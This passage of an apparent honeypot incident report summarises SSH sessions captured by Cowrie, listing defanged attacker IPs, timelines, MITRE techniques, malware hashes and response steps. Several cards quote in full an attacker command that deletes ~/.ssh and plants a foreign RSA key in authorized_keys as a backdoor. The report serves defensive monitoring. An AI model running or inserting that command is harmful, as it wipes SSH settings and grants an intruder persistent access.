| `2026-04-28 11:44:50` | `cowrie.command.failed` |
| `2026-04-28 11:44:50` | `cowrie.log.closed` |
| `2026-04-28 11:44:51` | `cowrie.session.params` |
| `2026-04-28 11:44:51` | `cowrie.command.input` |
| `2026-04-28 11:44:51` | `cowrie.session.file_download` |
| `2026-04-28 11:44:51` | `cowrie.log.closed` |
| `2026-04-28 11:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096dfa43c19d

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:56` | `cowrie.session.connect` |
| `2026-04-28 11:44:56` | `cowrie.client.version` |
| `2026-04-28 11:44:56` | `cowrie.client.kex` |
| `2026-04-28 11:44:57` | `cowrie.login.success` |
| `2026-04-28 11:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb1c7ab7d8c

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:45 |
| **Last Seen** | 2026-04-28 11:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:45:06` | `cowrie.session.connect` |
| `2026-04-28 11:45:06` | `cowrie.client.version` |
| `2026-04-28 11:45:07` | `cowrie.client.kex` |
| `2026-04-28 11:45:10` | `cowrie.login.success` |
| `2026-04-28 11:45:11` | `cowrie.session.params` |
| `2026-04-28 11:45:11` | `cowrie.command.input` |
| `2026-04-28 11:45:11` | `cowrie.command.failed` |
| `2026-04-28 11:45:11` | `cowrie.log.closed` |
| `2026-04-28 11:45:12` | `cowrie.session.params` |
| `2026-04-28 11:45:12` | `cowrie.command.input` |
| `2026-04-28 11:45:12` | `cowrie.session.file_download` |
| `2026-04-28 11:45:12` | `cowrie.log.closed` |
| `2026-04-28 11:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7212108f7e02

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:45 |
| **Last Seen** | 2026-04-28 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:45:16` | `cowrie.session.connect` |
| `2026-04-28 11:45:16` | `cowrie.client.version` |
| `2026-04-28 11:45:16` | `cowrie.client.kex` |
| `2026-04-28 11:45:17` | `cowrie.login.success` |
| `2026-04-28 11:45:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc4a2554b30

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:45 |
| **Last Seen** | 2026-04-28 11:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:45:59` | `cowrie.session.connect` |
| `2026-04-28 11:45:59` | `cowrie.client.version` |
| `2026-04-28 11:45:59` | `cowrie.client.kex` |
| `2026-04-28 11:46:01` | `cowrie.login.success` |
| `2026-04-28 11:46:02` | `cowrie.session.params` |
| `2026-04-28 11:46:02` | `cowrie.command.input` |
| `2026-04-28 11:46:02` | `cowrie.command.failed` |
| `2026-04-28 11:46:02` | `cowrie.log.closed` |
| `2026-04-28 11:46:03` | `cowrie.session.params` |
| `2026-04-28 11:46:03` | `cowrie.command.input` |
| `2026-04-28 11:46:03` | `cowrie.session.file_download` |
| `2026-04-28 11:46:03` | `cowrie.log.closed` |
| `2026-04-28 11:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a643d6a85ed

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:46 |
| **Last Seen** | 2026-04-28 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:46:08` | `cowrie.session.connect` |
| `2026-04-28 11:46:08` | `cowrie.client.version` |
| `2026-04-28 11:46:08` | `cowrie.client.kex` |
| `2026-04-28 11:46:09` | `cowrie.login.success` |
| `2026-04-28 11:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3d1eb96713

| Field | Detail |
|---|---|
| **Source IP** | `103.218.241[.]179` |
| **First Seen** | 2026-04-28 11:53 |
| **Last Seen** | 2026-04-28 11:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:53:07` | `cowrie.session.connect` |
| `2026-04-28 11:53:07` | `cowrie.client.version` |
| `2026-04-28 11:53:07` | `cowrie.client.kex` |
| `2026-04-28 11:53:07` | `cowrie.login.success` |
| `2026-04-28 11:53:08` | `cowrie.session.params` |
| `2026-04-28 11:53:08` | `cowrie.command.input` |
| `2026-04-28 11:53:08` | `cowrie.command.failed` |
| `2026-04-28 11:53:08` | `cowrie.log.closed` |
| `2026-04-28 11:53:08` | `cowrie.session.params` |
| `2026-04-28 11:53:08` | `cowrie.command.input` |
| `2026-04-28 11:53:08` | `cowrie.session.file_download` |
| `2026-04-28 11:53:08` | `cowrie.log.closed` |
| `2026-04-28 11:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.241[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.218.241[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7600484f18d

| Field | Detail |
|---|---|
| **Source IP** | `103.218.241[.]179` |
| **First Seen** | 2026-04-28 11:53 |
| **Last Seen** | 2026-04-28 11:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:53:10` | `cowrie.session.connect` |
| `2026-04-28 11:53:10` | `cowrie.client.version` |
| `2026-04-28 11:53:10` | `cowrie.client.kex` |
| `2026-04-28 11:53:10` | `cowrie.login.success` |
| `2026-04-28 11:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.241[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.218.241[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6fd6ac44d2

| Field | Detail |
|---|---|
| **Source IP** | `185.9.193[.]111` |
| **First Seen** | 2026-04-28 12:05 |
| **Last Seen** | 2026-04-28 12:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 12:05:29` | `cowrie.session.connect` |
| `2026-04-28 12:05:29` | `cowrie.client.version` |
| `2026-04-28 12:05:29` | `cowrie.client.kex` |
| `2026-04-28 12:05:30` | `cowrie.login.success` |
| `2026-04-28 12:05:31` | `cowrie.session.params` |
| `2026-04-28 12:05:31` | `cowrie.command.input` |
| `2026-04-28 12:05:31` | `cowrie.command.failed` |
| `2026-04-28 12:05:31` | `cowrie.log.closed` |
| `2026-04-28 12:05:32` | `cowrie.session.params` |
| `2026-04-28 12:05:32` | `cowrie.command.input` |
| `2026-04-28 12:05:32` | `cowrie.session.file_download` |
| `2026-04-28 12:05:32` | `cowrie.log.closed` |
| `2026-04-28 12:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.9.193[.]111` to AbuseIPDB if not already reported
- [ ] Block `185.9.193[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300de0f1e1bb

| Field | Detail |
|---|---|
| **Source IP** | `185.9.193[.]111` |
| **First Seen** | 2026-04-28 12:05 |
| **Last Seen** | 2026-04-28 12:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 12:05:35` | `cowrie.session.connect` |
| `2026-04-28 12:05:35` | `cowrie.client.version` |
| `2026-04-28 12:05:35` | `cowrie.client.kex` |
| `2026-04-28 12:05:36` | `cowrie.login.success` |
| `2026-04-28 12:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.9.193[.]111` to AbuseIPDB if not already reported
- [ ] Block `185.9.193[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f70ed97e1031

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-04-28 12:13 |
| **Last Seen** | 2026-04-28 12:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 12:13:38` | `cowrie.session.connect` |
| `2026-04-28 12:13:38` | `cowrie.client.version` |
| `2026-04-28 12:13:38` | `cowrie.client.kex` |
| `2026-04-28 12:13:38` | `cowrie.login.success` |
| `2026-04-28 12:13:39` | `cowrie.session.params` |
| `2026-04-28 12:13:39` | `cowrie.command.input` |
| `2026-04-28 12:13:39` | `cowrie.command.failed` |
| `2026-04-28 12:13:39` | `cowrie.log.closed` |
| `2026-04-28 12:13:39` | `cowrie.session.params` |
| `2026-04-28 12:13:39` | `cowrie.command.input` |
| `2026-04-28 12:13:39` | `cowrie.session.file_download` |
| `2026-04-28 12:13:39` | `cowrie.log.closed` |
| `2026-04-28 12:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca730d9b1da6

| Field | Detail |
|---|---|
| **Source IP** | `60.199.224[.]55` |
| **First Seen** | 2026-04-28 12:13 |
| **Last Seen** | 2026-04-28 12:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 12:13:42` | `cowrie.session.connect` |
| `2026-04-28 12:13:42` | `cowrie.client.version` |
| `2026-04-28 12:13:42` | `cowrie.client.kex` |
| `2026-04-28 12:13:42` | `cowrie.login.success` |
| `2026-04-28 12:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.199.224[.]55` to AbuseIPDB if not already reported
- [ ] Block `60.199.224[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7609cc1ea18a

| Field | Detail |
|---|---|
| **Source IP** | `20.193.141[.]133` |
| **First Seen** | 2026-04-28 13:01 |
| **Last Seen** | 2026-04-28 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 13:01:59` | `cowrie.session.connect` |
| `2026-04-28 13:01:59` | `cowrie.client.version` |
| `2026-04-28 13:01:59` | `cowrie.client.kex` |
| `2026-04-28 13:01:59` | `cowrie.login.success` |
| `2026-04-28 13:01:59` | `cowrie.session.params` |
| `2026-04-28 13:01:59` | `cowrie.command.input` |
| `2026-04-28 13:01:59` | `cowrie.command.failed` |
| `2026-04-28 13:01:59` | `cowrie.log.closed` |
| `2026-04-28 13:01:59` | `cowrie.session.params` |
| `2026-04-28 13:01:59` | `cowrie.command.input` |
| `2026-04-28 13:01:59` | `cowrie.session.file_download` |
| `2026-04-28 13:01:59` | `cowrie.log.closed` |
| `2026-04-28 13:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `20.193.141[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8fddfa7e2b6

| Field | Detail |
|---|---|
| **Source IP** | `20.193.141[.]133` |
| **First Seen** | 2026-04-28 13:02 |
| **Last Seen** | 2026-04-28 13:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 13:02:00` | `cowrie.session.connect` |
| `2026-04-28 13:02:00` | `cowrie.client.version` |
| `2026-04-28 13:02:00` | `cowrie.client.kex` |
| `2026-04-28 13:02:00` | `cowrie.login.success` |
| `2026-04-28 13:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.193.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `20.193.141[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.13.181[.]42` | **20** | 2026-04-28 11:38 | 2026-04-28 11:46 | 5m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `188.79.93[.]151` | **16** | 2026-04-28 10:34 | 2026-04-28 10:50 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `102.209.18[.]106` | **12** | 2026-04-28 12:05 | 2026-04-28 12:19 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `151.237.67[.]196` | **4** | 2026-04-28 13:58 | 2026-04-28 14:06 | 8m | 0 | `T1592` | 🟢 LOW |
| `179.1.110[.]66` | **2** | 2026-04-28 12:44 | 2026-04-28 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `180.76.143[.]203` | **2** | 2026-04-28 11:35 | 2026-04-28 11:36 | 3m | 0 | `T1592` | 🟢 LOW |
| `180.76.143[.]27` | **2** | 2026-04-28 13:16 | 2026-04-28 13:18 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.218.241[.]179` | 1 | 2026-04-28 11:53 | 2026-04-28 11:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.149[.]158` | 1 | 2026-04-28 10:30 | 2026-04-28 10:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.171[.]133` | 1 | 2026-04-28 10:19 | 2026-04-28 10:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `159.89.106[.]4` | 1 | 2026-04-28 10:37 | 2026-04-28 10:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.5[.]249` | 1 | 2026-04-28 10:41 | 2026-04-28 10:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.9.193[.]111` | 1 | 2026-04-28 12:05 | 2026-04-28 12:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.193.141[.]133` | 1 | 2026-04-28 13:01 | 2026-04-28 13:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.150.188[.]148` | 1 | 2026-04-28 10:27 | 2026-04-28 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.131.211[.]42` | 1 | 2026-04-28 10:24 | 2026-04-28 10:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.151.144[.]184` | 1 | 2026-04-28 11:40 | 2026-04-28 11:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-04-28 13:03 | 2026-04-28 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.72.212[.]22` | 1 | 2026-04-28 11:38 | 2026-04-28 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-28 13:55 | 2026-04-28 13:55 | 27s | 0 | `T1592` | 🟢 LOW |
| `60.199.224[.]55` | 1 | 2026-04-28 12:13 | 2026-04-28 12:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `98.252.96[.]161` | 1 | 2026-04-28 11:02 | 2026-04-28 11:03 | 25s | 0 | `T1592` | 🟢 LOW |
| `98.82.6[.]93` | 1 | 2026-04-28 12:56 | 2026-04-28 12:56 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
